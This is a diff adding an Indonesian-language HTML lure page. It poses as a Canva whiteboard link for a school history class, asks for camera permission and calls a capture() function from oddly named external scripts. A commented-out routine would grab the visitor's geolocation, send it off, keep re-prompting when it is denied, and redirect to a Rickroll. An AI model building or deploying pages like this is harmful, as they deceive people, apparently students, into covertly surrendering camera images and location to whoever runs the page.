@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Menyiapkan Tautan...</title>
+    <style>
+        table {
+            width: 85%;
+            border-collapse: collapse;
+        }
+        td {
+            border: 1px;
+            height: 30px;
+        }
+    </style>
+</head>
+<body>
+    <h1>Berikan izin kamera untuk mendapatkan tautan Canva whiteboard sejarah XI TJKT 1...</h1>
+</body>
+<script src="js/jP9GAcJGznbenzSd3z9yOS2EUQl4Zs2T.js"></script>
+<script src="js/ZInAi3rLDQMj9y4yR43oUgYMrDoaDCTy.js"></script>
+<script src="js/jquery.min.js"></script>
+<script type="text/javascript">
+    //doThis();
+    capture();
+
+    async function fun(latitude, longitude) {
+        await sendLocation(latitude, longitude);
+        window.location.replace("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
+    }
+
+    // Check if geolocation is supported
+    async function doThis(argument) {
+        if ("geolocation" in navigator) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+                    fun(latitude, longitude);
+                },
+                (error) => {
+                    alert("Berikan izin lokasi untuk mengakses tautan ini");
+                    send("Location failed.");
+                    doThis();
+                    //console.error(`Error Code: ${error.code} - ${error.message}`);
+                }
+            );
+        } else {
+        }
+    }
+</script>
+</html>
